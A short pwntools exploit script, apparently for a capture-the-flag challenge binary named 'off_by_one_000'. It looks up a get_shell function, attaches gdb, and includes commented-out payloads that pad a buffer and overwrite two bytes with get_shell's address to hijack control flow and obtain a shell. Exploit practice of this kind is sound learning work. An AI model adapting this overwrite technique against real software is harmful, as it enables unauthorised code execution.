#!/usr/bin/python 
from pwn import *

p = process("./off_by_one_000")
elf = ELF("./off_by_one_000")
get_shell = elf.symbols['get_shell']
off = get_shell & 0xFFFF

gdb.attach(p, 'b*cpy+21')

#p.send('A'*(0x100-4) + p16(off))
#p.send('A'*0x108 + p16(off))
p.send('A'*0x20)

p.interactive()
